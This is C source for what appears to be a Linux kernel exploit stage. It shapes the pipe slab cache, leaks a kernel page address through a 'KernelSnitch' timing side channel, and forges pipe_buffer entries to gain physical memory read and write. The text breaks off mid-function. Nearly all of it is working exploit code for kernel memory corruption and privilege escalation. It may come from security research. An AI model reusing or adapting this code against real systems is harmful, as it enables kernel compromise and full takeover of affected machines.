#include "common.h"

#if defined(PHYS_P0_ORACLE) && PHYS_P0_ORACLE
#include P0_FINGERPRINT_HEADER
#endif

#define PIPE_SHAPE_ROUNDS 0
#define PHYSRW_PROOF_OFF 0x7000
#define PHYS_READ_TAG "nebusec_70687973727730"
#define PHYS_WRITE_TAG "nebusec_70687973727731"
#define PHYS64_SEED 0x306365737562656eULL
#define PHYS64_NEXT 0x316365737562656eULL

static int pipe_objects_ready;
static int pipe_fds_n[PIPE_N_COUNT][2];
static int pipe_fds_c[PIPE_C_COUNT][2];
static int pipe_fds_e[PIPE_E_COUNT][2];
static int pipe_fds_drain[PIPE_DRAIN][2];
int pipe_fds_reclaim[PIPE_RECLAIM][2];
pid_t pipe_prepare_child = -1;
uint64_t kmalloc_pipe_cache;
uint64_t kmalloc_normal_1k_cache;
uint64_t kmalloc_normal_2k_cache;
uint64_t kmalloc_cgroup_1k_cache;
uint64_t kmalloc_cgroup_2k_cache;
uint64_t candidate_slab_cache;
int pipe_cache_gate_ok;
int pipe_cache_page_index = -1;
int pipe_cache_slot_hit = -1;
uint64_t pipe_page_slab_cache[PIPE_CANDIDATE_PAGES];
uint32_t pipe_page_type[PIPE_CANDIDATE_PAGES];
uintptr_t pipebuf_page_base;
uintptr_t pipebuf_addr;
int pipebuf_pipe_idx = -1;
char physrw_readback[64];
char physrw_after_write[64];
int physrw_read_ok;
int physrw_write_ok;
int pipe_scan_vmemmap;
int pipe_scan_ops;
int pipe_scan_len;
int pipe_probe_found;
uint64_t pipe_probe_page;
uint64_t pipe_probe_ops;
uint64_t pipe_probe_private;
uint32_t pipe_probe_len;
uint32_t pipe_probe_flags;
uint64_t pipe_scan_first_page;
uint64_t pipe_scan_first_ops;
uint64_t pipe_scan_q0;
uint64_t pipe_scan_q1;
uint64_t pipe_scan_q2;
uint64_t pipe_scan_q3;
uint32_t pipe_scan_first_len;
uint32_t pipe_scan_first_flags;
uint64_t physrw_read64_before;
uint64_t physrw_read64_after;
uint64_t physrw_write64_value;
int physrw_read64_ok;
int physrw_write64_ok;

void init_ctx(struct mm_ctx *ctx, size_t cnt) {
  ctx->mm_cnt = cnt;
  ctx->childs = calloc(sizeof(pid_t), cnt);
  ctx->memfds = calloc(sizeof(int), cnt);
}

void resize_pipe_slots(int pipefd[2], size_t slots) {
  SYSCHK(fcntl(pipefd[0], F_SETPIPE_SZ, slots * PAGE_SIZE));
}

void make_pipe_object(int pipefd[2]) {
  SYSCHK(pipe(pipefd));
  resize_pipe_slots(pipefd, 2);
}

void alloc_pipe_object(int pipefd[2]) {
  resize_pipe_slots(pipefd, PIPE_BUFFER_SLOTS);
}

void free_pipe_object(int pipefd[2]) {
  resize_pipe_slots(pipefd, 2);
}

void shape_pipe_cache_once(void) {
  for (size_t i = 0; i < PIPE_N_COUNT; i++) {
    alloc_pipe_object(pipe_fds_n[i]);
  }
  for (size_t i = 0; i < PIPE_C_COUNT; i++) {
    alloc_pipe_object(pipe_fds_c[i]);
  }
  for (size_t i = 0; i < PIPE_E_COUNT; i++) {
    alloc_pipe_object(pipe_fds_e[i]);
  }
  for (size_t i = 0; i < PIPE_N_COUNT; i += PIPE_OBJS_PER_SLAB) {
    free_pipe_object(pipe_fds_n[i]);
  }
  for (size_t i = 0; i < PIPE_E_COUNT; i++) {
    free_pipe_object(pipe_fds_e[i]);
  }
  for (size_t i = 0; i < PIPE_C_COUNT; i += PIPE_OBJS_PER_SLAB) {
    free_pipe_object(pipe_fds_c[i]);
  }
}

void shape_pipe_cache(void) {
  for (int round = 0; round < PIPE_SHAPE_ROUNDS; round++) {
    for (size_t i = 0; i < PIPE_N_COUNT; i++) {
      free_pipe_object(pipe_fds_n[i]);
    }
    for (size_t i = 0; i < PIPE_C_COUNT; i++) {
      free_pipe_object(pipe_fds_c[i]);
    }
    for (size_t i = 0; i < PIPE_E_COUNT; i++) {
      free_pipe_object(pipe_fds_e[i]);
    }
    shape_pipe_cache_once();
  }
}

uintptr_t prepare_pipe_buffer_page_child(void) {
  struct mm_ctx prep;
  struct mm_ctx spray;
  struct mm_ctx pre;
  struct mm_ctx post;
  size_t objs_per_slab = ORDER3_SIZE / MM_STRUCT_SZ;

  init_ctx(&prep, 32 * objs_per_slab);
  init_ctx(&spray, (1 + MM_PARTIALS) * objs_per_slab);
  init_ctx(&pre, objs_per_slab - 1);
  init_ctx(&post, objs_per_slab);

  for (size_t i = 0; i < prep.mm_cnt; i++) {
    prep.childs[i] = -1;
    prep.memfds[i] = clone_memfd();
  }
  for (size_t i = 0; i < spray.mm_cnt; i++) {
    spray.childs[i] = -1;
    spray.memfds[i] = clone_memfd();
  }

  setup_kernelsnitch();

  for (size_t i = 0; i < pre.mm_cnt; i++) {
    pre.childs[i] = -1;
    pre.memfds[i] = clone_memfd();
  }
  pid_t leak_child = clone_leak_child();
  for (size_t i = 0; i < post.mm_cnt; i++) {
    post.childs[i] = -1;
    post.memfds[i] = clone_memfd();
  }
  int leak_memfd = open_memfd(leak_child);

  for (size_t i = 0; i < pre.mm_cnt; i++) {
    kill_child(pre.childs[i]);
  }
  for (size_t i = 0; i < post.mm_cnt; i++) {
    kill_child(post.childs[i]);
  }
  for (size_t i = 0; i < spray.mm_cnt; i++) {
    kill_child(spray.childs[i]);
  }
  SYSCHK(waitpid(leak_child, NULL, 0));

  if (!kernelsnitch_collisions_ready()) {
    pr_error("pipe KernelSnitch collision finding failed\n");
  }

  unsigned char *buf = malloc(SKB_SEND_SIZE);
  memset(buf, 0x50, SKB_SEND_SIZE);

  int skb_sv[2];
  int pcp_sv[2];
  SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, skb_sv));
  SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, pcp_sv));

  struct iovec iov;
  memset(&iov, 0, sizeof(iov));
  iov.iov_base = buf;
  iov.iov_len = SKB_SEND_SIZE;

  struct msghdr msg;
  memset(&msg, 0, sizeof(msg));
  msg.msg_iov = &iov;
  msg.msg_iovlen = 1;

  SYSCHK(sendmsg(pcp_sv[0], &msg, 0));
  pin_to_core(CORE);

  sched_yield();
  sched_yield();
  sched_yield();
  sched_yield();
  for (size_t i = 0; i < pre.mm_cnt; i++) {
    SYSCHK(close(pre.memfds[i]));
    pre.memfds[i] = -1;
  }
  for (size_t i = 0; i < post.mm_cnt - 1; i++) {
    SYSCHK(close(post.memfds[i]));
    post.memfds[i] = -1;
  }
  for (size_t i = 0; i < spray.mm_cnt; i += objs_per_slab) {
    SYSCHK(close(spray.memfds[i]));
    spray.memfds[i] = -1;
  }
  SYSCHK(close(pcp_sv[0]));
  SYSCHK(close(pcp_sv[1]));

  sched_yield();
  sched_yield();
  sched_yield();
  sched_yield();
  SYSCHK(close(leak_memfd));
  SYSCHK(sendmsg(skb_sv[0], &msg, 0));

  run_kernelsnitch_bruteforce();
  uintptr_t leaked = cleanup_kernelsnitch();
  if (leaked == (uintptr_t)-1) {
    pr_warning("pipe KernelSnitch sk_buff page leak failed\n");
    close_ctx_memfds(&prep);
    close_ctx_memfds(&spray);
    close_ctx_memfds(&pre);
    close_ctx_memfds(&post);
    free_ctx_storage(&prep);
    free_ctx_storage(&spray);
    free_ctx_storage(&pre);
    free_ctx_storage(&post);
    free(buf);
    return 0;
  }
  uintptr_t base = leaked & ~(ORDER3_SIZE - 1);
#if defined(REQUIRE_FRESH_P0_SESSION) && REQUIRE_FRESH_P0_SESSION
  if (getenv("KS_LEAK_ONLY")) {
    pr_success("KernelSnitch leak-only mm=%016zx base=%016zx object_index=%zu\n",
               leaked, base, (leaked - base) / MM_STRUCT_SZ);
    fflush(NULL);
    _exit(0);
  }
#endif

  shape_pipe_cache();

  for (size_t i = 0; i < PIPE_DRAIN; i++) {
    alloc_pipe_object(pipe_fds_drain[i]);
  }

  pin_to_core(CORE);
  SYSCHK(close(skb_sv[0]));
  SYSCHK(close(skb_sv[1]));
  for (size_t i = 0; i < PIPE_RECLAIM; i++) {
    alloc_pipe_object(pipe_fds_reclaim[i]);
  }

  close_ctx_memfds(&prep);
  close_ctx_memfds(&spray);
  close_ctx_memfds(&pre);
  close_ctx_memfds(&post);
  free_ctx_storage(&prep);
  free_ctx_storage(&spray);
  free_ctx_storage(&pre);
  free_ctx_storage(&post);
  free(buf);
  return base;
}

uintptr_t prepare_pipe_buffer_page(void) {
  if (PIPE_SHAPE_ROUNDS != 0) {
    for (size_t i = 0; i < PIPE_N_COUNT; i++) {
      make_pipe_object(pipe_fds_n[i]);
    }
    for (size_t i = 0; i < PIPE_C_COUNT; i++) {
      make_pipe_object(pipe_fds_c[i]);
    }
    for (size_t i = 0; i < PIPE_E_COUNT; i++) {
      make_pipe_object(pipe_fds_e[i]);
    }
  }
  for (size_t i = 0; i < PIPE_DRAIN; i++) {
    make_pipe_object(pipe_fds_drain[i]);
  }
  for (size_t i = 0; i < PIPE_RECLAIM; i++) {
    make_pipe_object(pipe_fds_reclaim[i]);
  }
  pipe_objects_ready = 1;

  int result_pipe[2];
  SYSCHK(pipe(result_pipe));
  pid_t child = SYSCHK(fork());
  if (child == 0) {
    SYSCHK(prctl(PR_SET_PDEATHSIG, SIGKILL));
    if (getppid() == 1) {
      _exit(1);
    }
    SYSCHK(close(result_pipe[0]));
    uintptr_t base = prepare_pipe_buffer_page_child();
    for (size_t i = 0; i < PIPE_DRAIN; i++) {
      close(pipe_fds_drain[i][0]);
      close(pipe_fds_drain[i][1]);
      pipe_fds_drain[i][0] = -1;
      pipe_fds_drain[i][1] = -1;
    }
    SYSCHK(write(result_pipe[1], &base, sizeof(base)));
    for (;;) {
      sleep(60);
    }
  }

  pipe_prepare_child = child;
  SYSCHK(close(result_pipe[1]));
  uintptr_t base = 0;
  ssize_t got = read(result_pipe[0], &base, sizeof(base));
  SYSCHK(close(result_pipe[0]));
  if (got != (ssize_t)sizeof(base)) {
    pr_warning("pipe page child did not report base\n");
    base = 0;
  }
  for (size_t i = 0; i < PIPE_DRAIN; i++) {
    close(pipe_fds_drain[i][0]);
    close(pipe_fds_drain[i][1]);
    pipe_fds_drain[i][0] = -1;
    pipe_fds_drain[i][1] = -1;
  }
  return base;
}

void reset_pipe_attempt(void) {
  if (pipe_prepare_child > 0) {
    kill(pipe_prepare_child, SIGKILL);
    waitpid(pipe_prepare_child, NULL, 0);
    pipe_prepare_child = -1;
  }

  if (pipe_objects_ready) {
    for (size_t i = 0; i < PIPE_DRAIN; i++) {
      close(pipe_fds_drain[i][0]);
      close(pipe_fds_drain[i][1]);
    }
    for (size_t i = 0; i < PIPE_RECLAIM; i++) {
      close(pipe_fds_reclaim[i][0]);
      close(pipe_fds_reclaim[i][1]);
    }
    pipe_objects_ready = 0;
  }

#if defined(PHYS_P0_ORACLE) && PHYS_P0_ORACLE
#if defined(REQUIRE_FRESH_P0_SESSION) && REQUIRE_FRESH_P0_SESSION
  close_p0_gate_holders();
#else
  if (p0_gate_holders_initialized) {
    for (size_t i = 0; i < PIPE_RECLAIM; i++) {
      if (p0_gate_holders[i][0] >= 0) {
        close(p0_gate_holders[i][0]);
      }
      if (p0_gate_holders[i][1] >= 0) {
        close(p0_gate_holders[i][1]);
      }
      p0_gate_holders[i][0] = -1;
      p0_gate_holders[i][1] = -1;
    }
    p0_gate_holders_initialized = 0;
  }
#endif
#endif

  pipebuf_page_base = 0;
  pipebuf_addr = 0;
  pipebuf_pipe_idx = -1;
  pipe_cache_gate_ok = 0;
  pipe_cache_page_index = -1;
  pipe_cache_slot_hit = -1;
  pipe_probe_found = 0;
  pipe_probe_page = 0;
  pipe_probe_ops = 0;
  pipe_probe_private = 0;
  pipe_probe_len = 0;
  pipe_probe_flags = 0;
  candidate_slab_cache = 0;
  atomic_store(&pipe_prepare_request, 0);
  atomic_store(&pipe_prepare_done, 0);
}

uintptr_t direct_to_page(uintptr_t addr) {
  uintptr_t pfn = (addr - DIRECT_MAP_BASE) >> PAGE_SHIFT;
  return VMEMMAP_START + pfn * STRUCT_PAGE_SIZE;
}

uintptr_t direct_to_head_page(int fd, uintptr_t addr) {
  uintptr_t page = direct_to_page(addr);
  uintptr_t head_addr = page + STRUCT_PAGE_COMPOUND_HEAD_OFF;
  uint64_t compound_head = kernel_read64(fd, head_addr);
  if (compound_head & 1) {
    return compound_head & ~1ULL;
  }
  return page;
}

uintptr_t page_to_direct(uintptr_t page) {
  uintptr_t pfn = (page - VMEMMAP_START) / STRUCT_PAGE_SIZE;
  return DIRECT_MAP_BASE + (pfn << PAGE_SHIFT);
}

uintptr_t pipe_buf_ops_addr(void) {
  return text_addr(ANON_PIPE_BUF_OPS);
}

int pipe_cache_matches(uint64_t slab_cache) {
  if (slab_cache == 0) {
    return 0;
  }
  if (KMALLOC_PIPE_INDEX == 10) {
    return slab_cache == kmalloc_normal_1k_cache ||
           slab_cache == kmalloc_cgroup_1k_cache;
  }
  if (KMALLOC_PIPE_INDEX == 11) {
    return slab_cache == kmalloc_normal_2k_cache ||
           slab_cache == kmalloc_cgroup_2k_cache;
  }
  return slab_cache == kmalloc_pipe_cache;
}

int pipe_reclaim_cache_gate(int fd) {
  if (!is_direct_ptr(pipebuf_page_base)) {
    return 0;
  }

  pipe_cache_page_index = -1;
  pipe_cache_slot_hit = -1;
  memset(pipe_page_slab_cache, 0, sizeof(pipe_page_slab_cache));
  memset(pipe_page_type, 0, sizeof(pipe_page_type));

  uint64_t cache_slots[KMALLOC_CACHE_SLOTS];
  memset(cache_slots, 0, sizeof(cache_slots));
  uintptr_t kmalloc_caches = data_addr(KMALLOC_CACHES);
  kernel_read_data(fd, kmalloc_caches, cache_slots, sizeof(cache_slots));
  kmalloc_normal_1k_cache =
    cache_slots[KMALLOC_NORMAL_TYPE * KMALLOC_BUCKETS + 10];
  kmalloc_normal_2k_cache =
    cache_slots[KMALLOC_NORMAL_TYPE * KMALLOC_BUCKETS + 11];
  kmalloc_cgroup_1k_cache =
    cache_slots[KMALLOC_CGROUP_TYPE * KMALLOC_BUCKETS + 10];
  kmalloc_cgroup_2k_cache =
    cache_slots[KMALLOC_CGROUP_TYPE * KMALLOC_BUCKETS + 11];

  kmalloc_pipe_cache =
    kernel_read64(fd, data_addr(KMALLOC_CGROUP_PIPE_SLOT));
  #ifdef DEBUG
  pr_info("pipe caches normal1k=%016zx normal2k=%016zx "
          "cgroup1k=%016zx cgroup2k=%016zx selected=%016zx\n",
          kmalloc_normal_1k_cache, kmalloc_normal_2k_cache,
          kmalloc_cgroup_1k_cache, kmalloc_cgroup_2k_cache,
          kmalloc_pipe_cache);
#endif
  for (size_t off = 0; off < ORDER3_SIZE; off += PAGE_SIZE) {
    uintptr_t page = pipebuf_page_base + off;
    uintptr_t head = direct_to_head_page(fd, page);
    uint64_t slab_cache = kernel_read64(fd, head + STRUCT_SLAB_CACHE_OFF);
    uintptr_t type_addr = head + STRUCT_PAGE_TYPE_OFF;
    uint32_t page_type = (uint32_t)kernel_read64(fd, type_addr);
    pipe_page_slab_cache[off / PAGE_SIZE] = slab_cache;
    pipe_page_type[off / PAGE_SIZE] = page_type;
    int cache_match = pipe_cache_matches(slab_cache);
    #ifdef DEBUG
    uint64_t cache08 = kernel_read64(fd, head + 0x08);
    uint64_t cache10 = kernel_read64(fd, head + 0x10);
    uint64_t cache18 = kernel_read64(fd, head + 0x18);
    uint64_t cache20 = kernel_read64(fd, head + 0x20);
    pr_info("pipe page idx=%zu page=%016zx head=%016zx "
            "cache08=%016llx cache10=%016llx cache18=%016llx "
            "cache20=%016llx type=%08x match=%d\n",
            off / PAGE_SIZE, page, head,
            (unsigned long long)cache08,
            (unsigned long long)cache10,
            (unsigned long long)cache18,
            (unsigned long long)cache20, page_type, cache_match);
#endif
    if (off == 0 || cache_match) {
      candidate_slab_cache = slab_cache;
    }
    for (int slot = 0; slot < KMALLOC_CACHE_SLOTS; slot++) {
      if (cache_slots[slot] == slab_cache) {
        pipe_cache_slot_hit = slot;
      }
    }
    if (cache_match) {
      pipebuf_page_base = page;
      pipe_cache_page_index = off / PAGE_SIZE;
      pipe_cache_gate_ok = 1;
      return 1;
    }
  }

  pipe_cache_gate_ok = 0;
  return 0;
}

int read_pipe_slab(int fd, uintptr_t base, unsigned char *slab) {
  for (size_t off = 0; off < ORDER3_SIZE; off += PIPE_SCAN_CHUNK) {
    if (kernel_read_data(fd, base + off, slab + off, PIPE_SCAN_CHUNK) !=
        PIPE_SCAN_CHUNK) {
      return 0;
    }
  }
  return 1;
}

int find_pipe_buffer(int fd, uintptr_t base) {
  unsigned char slab[ORDER3_SIZE];
  pipebuf_addr = 0;
  pipebuf_pipe_idx = -1;
  pipe_probe_found = 0;
  pipe_probe_page = 0;
  pipe_probe_ops = 0;
  pipe_probe_private = 0;
  pipe_probe_len = 0;
  pipe_probe_flags = 0;
  pipe_scan_vmemmap = 0;
  pipe_scan_ops = 0;
  pipe_scan_len = 0;
  pipe_scan_first_page = 0;
  pipe_scan_first_ops = 0;
  pipe_scan_first_len = 0;
  pipe_scan_first_flags = 0;
  pipe_scan_q0 = 0;
  pipe_scan_q1 = 0;
  pipe_scan_q2 = 0;
  pipe_scan_q3 = 0;
  if (!read_pipe_slab(fd, base, slab)) {
    return 0;
  }
  memcpy(&pipe_scan_q0, slab + 0x00, 8);
  memcpy(&pipe_scan_q1, slab + 0x08, 8);
  memcpy(&pipe_scan_q2, slab + 0x10, 8);
  memcpy(&pipe_scan_q3, slab + 0x18, 8);

  for (size_t off = 0; off + sizeof(struct user_pipe_buffer) <= ORDER3_SIZE;
       off += 8) {
    struct user_pipe_buffer pb;
    memcpy(&pb, slab + off, sizeof(pb));
    if (pb.page >= VMEMMAP_START && pb.page < VMEMMAP_END) {
      pipe_scan_vmemmap++;
      if (pipe_scan_first_page == 0) {
        pipe_scan_first_page = pb.page;
        pipe_scan_first_ops = pb.ops;
        pipe_scan_first_len = pb.len;
        pipe_scan_first_flags = pb.flags;
      }
    } else {
      continue;
    }
    if (pb.ops == pipe_buf_ops_addr()) {
      pipe_scan_ops++;
    }
    if (pb.len > 0 && pb.len <= PIPE_RECLAIM) {
      pipe_scan_len++;
    }
    if (pb.offset != 0 || pb.ops != pipe_buf_ops_addr() ||
        pb.flags != PIPE_BUF_FLAG_CAN_MERGE || pb.private != 0) {
      continue;
    }
    if (pb.len == 0 || pb.len > PIPE_RECLAIM) {
      continue;
    }

    pipebuf_addr = base + off;
    pipebuf_pipe_idx = (int)pb.len - 1;
    pipe_probe_found = 1;
    pipe_probe_page = pb.page;
    pipe_probe_ops = pb.ops;
    pipe_probe_private = pb.private;
    pipe_probe_len = pb.len;
    pipe_probe_flags = pb.flags;
    return 1;
  }

  return 0;
}

int pipe_phys_read(
    int fd, int pipefd[2], uintptr_t buf_addr, uintptr_t direct_addr,
    void *out, size_t len) {
  struct user_pipe_buffer saved;
  if (kernel_read_data(fd, buf_addr, &saved, sizeof(saved)) !=
      (ssize_t)sizeof(saved)) {
    return 0;
  }

  struct user_pipe_buffer pb = saved;
  pb.page = direct_to_page(direct_addr);
  pb.offset = direct_addr & (PAGE_SIZE - 1);
  pb.len = len + 1;
  pb.ops = pipe_buf_ops_addr();
  pb.flags = PIPE_BUF_FLAG_CAN_MERGE;
  pb.private = 0;

  if (kernel_write_data(fd, buf_addr, &pb, sizeof(pb)) !=
      (ssize_t)sizeof(pb)) {
    return 0;
  }

  ssize_t got = read(pipefd[0], out, len);
  int ok = got == (ssize_t)len;
  kernel_write_data(fd, buf_addr, &saved, sizeof(saved));
  return ok;
}

int pipe_phys_write(
    int fd, int pipefd[2], uintptr_t buf_addr, uintptr_t direct_addr,
    const void *data, size_t len) {
  struct user_pipe_buffer saved;
  if (kernel_read_data(fd, buf_addr, &saved, sizeof(saved)) !=
      (ssize_t)sizeof(saved)) {
    return 0;
  }

  struct user_pipe_buffer pb = saved;
  pb.page = direct_to_page(direct_addr);
  pb.offset = direct_addr & (PAGE_SIZE - 1);
  pb.len = 0;
  pb.ops = pipe_buf_ops_addr();
  pb.flags = PIPE_BUF_FLAG_CAN_MERGE;
  pb.private = 0;

  if (kernel_write_data(fd, buf_addr, &pb, sizeof(pb)) !=
      (ssize_t)sizeof(pb)) {
    return 0;
  }

  ssize_t wrote = write(pipefd[1], data, len);
  int ok = wrote == (ssize_t)len;
  kernel_write_data(fd, buf_addr, &saved, sizeof(saved));
  return ok;
}

#if !defined(EXACT_PIPE_BUFFER_ONLY) || !EXACT_PIPE_BUFFER_ONLY
void forge_pipe_buffers_on_page(
    int fd, uintptr_t base, uintptr_t direct_addr, size_t len, int for_write) {
  struct user_pipe_buffer pb;
  memset(&pb, 0, sizeof(pb));
  pb.page = direct_to_page(direct_addr);
  pb.offset = direct_addr & (PAGE_SIZE - 1);
  pb.len = for_write ? 0 : len + 1;
  pb.ops = pipe_buf_ops_addr();
  pb.flags = PIPE_BUF_FLAG_CAN_MERGE;

  for (size_t off = 0; off < PIPE_SLAB_SIZE; off += PIPE_OBJECT_SIZE) {
    kernel_write_data(fd, base + off, &pb, sizeof(pb));
  }
}
#endif

int pipe_phys_read_data(int fd, uintptr_t direct_addr, void *out, size_t len) {
  if (pipebuf_page_base == 0 || pipebuf_pipe_idx < 0) {
    return 0;
  }
  if (!is_direct_ptr(direct_addr) ||
      (direct_addr & (PAGE_SIZE - 1)) + len > PAGE_SIZE) {
    return 0;
  }

  if (pipebuf_addr) {
    int *pipefd = pipe_fds_reclaim[pipebuf_pipe_idx];
    return pipe_phys_read(fd, pipefd, pipebuf_addr, direct_addr, out, len);
  }
#if defined(EXACT_PIPE_BUFFER_ONLY) && EXACT_PIPE_BUFFER_ONLY
  return 0;
#else
  forge_pipe_buffers_on_page(fd, pipebuf_page_base, direct_addr, len, 0);
  ssize_t got = read(pipe_fds_reclaim[pipebuf_pipe_idx][0], out, len);
  return got == (ssize_t)len;
#endif
}

int pipe_phys_write_data(
    int fd, uintptr_t direct_addr, const void *data, size_t len) {
  if (pipebuf_page_base == 0 || pipebuf_pipe_idx < 0) {
    return 0;
  }
  if (!is_direct_ptr(direct_addr) ||
      (direct_addr & (PAGE_SIZE - 1)) + len > PAGE_SIZE) {
    return 0;
  }

  if (pipebuf_addr) {
    int *pipefd = pipe_fds_reclaim[pipebuf_pipe_idx];
    return pipe_phys_write(fd, pipefd, pipebuf_addr, direct_addr, data, len);
  }
#if defined(EXACT_PIPE_BUFFER_ONLY) && EXACT_PIPE_BUFFER_ONLY
  return 0;
#else
  forge_pipe_buffers_on_page(fd, pipebuf_page_base, direct_addr, len, 1);
  ssize_t wrote = write(pipe_fds_reclaim[pipebuf_pipe_idx][1], data, len);
  return wrote == (ssize_t)len;
#endif
}

static int pipe_read64_checked(
    int fd, uintptr_t direct_addr, uint64_t *value) {
  return value &&
         pipe_phys_read_data(fd, direct_addr, value, sizeof(*value));
}

int pipe_write64(int fd, uintptr_t direct_addr, uint64_t value) {
  return pipe_phys_write_data(fd, direct_addr, &value, sizeof(value));
}

int install_pipe_physrw(int fd) {
  int ok = 0;
  int proof_saved = 0;
  int proof64_saved = 0;
  char saved_proof[sizeof(PHYS_WRITE_TAG)];
  char restored_proof[sizeof(saved_proof)];
  uint64_t saved_proof64 = 0;
  uint64_t restored_proof64 = 0;

  if (pipebuf_page_base == 0) {
    atomic_store(&pipe_prepare_done, 0);
    atomic_store(&pipe_prepare_request, 1);
    while (!atomic_load(&pipe_prepare_done)) {
      usleep(10000);
    }
  }

  uintptr_t proof_addr = page_base + PHYSRW_PROOF_OFF;
  uintptr_t proof64_addr = proof_addr + 0x100;
  uintptr_t proof_page = page_to_direct(direct_to_page(proof_addr));
  if (proof_page != (proof_addr & ~(PAGE_SIZE - 1)) ||
      sizeof(PHYS_READ_TAG) > PAGE_SIZE - (proof_addr & (PAGE_SIZE - 1)) ||
      sizeof(saved_proof) > PAGE_SIZE - (proof_addr & (PAGE_SIZE - 1)) ||
      sizeof(saved_proof64) >
          PAGE_SIZE - (proof64_addr & (PAGE_SIZE - 1)) ||
      (proof_addr & ~(PAGE_SIZE - 1)) !=
          (proof64_addr & ~(PAGE_SIZE - 1))) {
    return 0;
  }
  if (!pipe_reclaim_cache_gate(fd)) {
    pr_info("phys step cache gate failed slab=%016zx want=%016zx\n",
            candidate_slab_cache, kmalloc_pipe_cache);
    return 0;
  }

  char marker[PIPE_RECLAIM];
  memset(marker, 0x61, sizeof(marker));
  for (size_t i = 0; i < PIPE_RECLAIM; i++) {
    SYSCHK(write(pipe_fds_reclaim[i][1], marker, i + 1));
  }

  int found = find_pipe_buffer(fd, pipebuf_page_base);
  pr_info("phys step pipe probe found=%d pipebuf=%016zx idx=%d scan=%d/%d/%d\n",
          found, pipebuf_addr, pipebuf_pipe_idx, pipe_scan_vmemmap,
          pipe_scan_ops, pipe_scan_len);
  if (!found) {
    return 0;
  }
  if (!pipe_cache_gate_ok) {
    pipe_cache_gate_ok = 2;
  }

  char seed[] = PHYS_READ_TAG;
  if (kernel_read_data(fd, proof_addr, saved_proof, sizeof(saved_proof)) !=
      (ssize_t)sizeof(saved_proof)) {
    pr_error("phys proof old read failed addr=%016zx size=%zu\n",
             proof_addr, sizeof(saved_proof));
    goto cleanup;
  }
  proof_saved = 1;
  if (kernel_read_data(fd, proof64_addr, &saved_proof64,
                       sizeof(saved_proof64)) !=
      (ssize_t)sizeof(saved_proof64)) {
    pr_error("phys proof64 old read failed addr=%016zx\n", proof64_addr);
    goto cleanup;
  }
  proof64_saved = 1;
  pr_info("phys proof spans data=%016zx-%016zx qword=%016zx-%016zx\n",
          proof_addr, proof_addr + sizeof(saved_proof) - 1,
          proof64_addr, proof64_addr + sizeof(saved_proof64) - 1);
  if (kernel_write_data(fd, proof_addr, seed, sizeof(seed)) !=
      (ssize_t)sizeof(seed)) {
    goto cleanup;
  }

  memset(physrw_readback, 0, sizeof(physrw_readback));
  physrw_read_ok =
    pipe_phys_read_data(fd, proof_addr, physrw_readback, sizeof(seed));
  pr_info("phys step probed read done ok=%d idx=%d\n",
          physrw_read_ok, pipebuf_pipe_idx);

  char overwrite[] = PHYS_WRITE_TAG;
  physrw_write_ok =
    pipe_phys_write_data(fd, proof_addr, overwrite, sizeof(overwrite));
  pr_info("phys step probed write done ok=%d\n", physrw_write_ok);
  if (kernel_read_data(fd, proof_addr, physrw_after_write,
                       sizeof(overwrite)) != (ssize_t)sizeof(overwrite)) {
    goto cleanup;
  }

  uint64_t seed64 = PHYS64_SEED;
  uint64_t next64 = PHYS64_NEXT;
  if (kernel_write_data(fd, proof64_addr, &seed64, sizeof(seed64)) !=
      (ssize_t)sizeof(seed64)) {
    goto cleanup;
  }
  if (!pipe_read64_checked(fd, proof64_addr, &physrw_read64_before)) {
    goto cleanup;
  }
  physrw_read64_ok = physrw_read64_before == seed64;
  pr_info("phys step read64 done ok=%d value=%016zx\n",
          physrw_read64_ok, physrw_read64_before);
  physrw_write64_value = next64;
  physrw_write64_ok = pipe_write64(fd, proof64_addr, next64);
  if (kernel_read_data(fd, proof64_addr, &physrw_read64_after,
                       sizeof(physrw_read64_after)) !=
      (ssize_t)sizeof(physrw_read64_after)) {
    goto cleanup;
  }
  physrw_write64_ok =
    physrw_write64_ok && physrw_read64_after == physrw_write64_value;

  ok = physrw_read_ok &&
       memcmp(physrw_readback, seed, sizeof(seed)) == 0 &&
       physrw_write_ok &&
       memcmp(physrw_after_write, overwrite, sizeof(overwrite)) == 0 &&
       physrw_read64_ok && physrw_write64_ok;

cleanup:
  if (proof64_saved) {
    int write_ok = kernel_write_data(fd, proof64_addr, &saved_proof64,
                                     sizeof(saved_proof64)) ==
                   (ssize_t)sizeof(saved_proof64);
    int read_ok = kernel_read_data(fd, proof64_addr, &restored_proof64,
                                   sizeof(restored_proof64)) ==
                  (ssize_t)sizeof(restored_proof64);
    int restore_ok = write_ok && read_ok &&
                     restored_proof64 == saved_proof64;
    pr_info("phys proof64 restore=%d old=%016llx now=%016llx\n",
            restore_ok, (unsigned long long)saved_proof64,
            (unsigned long long)restored_proof64);
    ok &= restore_ok;
  }
  if (proof_saved) {
    int write_ok = kernel_write_data(fd, proof_addr, saved_proof,
                                     sizeof(saved_proof)) ==
                   (ssize_t)sizeof(saved_proof);
    int read_ok = kernel_read_data(fd, proof_addr, restored_proof,
                                   sizeof(restored_proof)) ==
                  (ssize_t)sizeof(restored_proof);
    int restore_ok = write_ok && read_ok &&
                     memcmp(restored_proof, saved_proof,
                            sizeof(saved_proof)) == 0;
    pr_info("phys proof restore=%d size=%zu\n",
            restore_ok, sizeof(saved_proof));
    ok &= restore_ok;
  }
  return ok;
}

#if defined(PHYS_P0_ORACLE) && PHYS_P0_ORACLE
int pipe_write_full(int fd, const void *data, size_t size) {
  const unsigned char *cursor = data;
  while (size) {
    ssize_t wrote = write(fd, cursor, size);
    if (wrote <= 0) {
      return 0;
    }
    cursor += wrote;
    size -= (size_t)wrote;
  }
  return 1;
}

int pipe_read_full(int fd, void *data, size_t size) {
  unsigned char *cursor = data;
  while (size) {
    ssize_t got = read(fd, cursor, size);
    if (got <= 0) {
      return 0;
    }
    cursor += got;
    size -= (size_t)got;
  }
  return 1;
}

int pipe_duplicate_bytes(
    int source_fd, int holder[2], size_t size, size_t slots) {
  SYSCHK(pipe(holder));
  resize_pipe_slots(holder, slots);
  errno = 0;
  ssize_t duplicated = syscall(SYS_tee, source_fd, holder[1], size, 0);
  return duplicated == (ssize_t)size;
}

static int transfer_p0_references_to_root(int retained_pipe_index) {
  int retained_fds[] = {
    pipe_fds_reclaim[retained_pipe_index][0],
    p0_gate_holders[retained_pipe_index][0],
    reclaim_receiver_fd(),
  };
  for (size_t index = 0;
       index < sizeof(retained_fds) / sizeof(retained_fds[0]); index++) {
    if (retained_fds[index] < 0) {
      return 0;
    }
  }

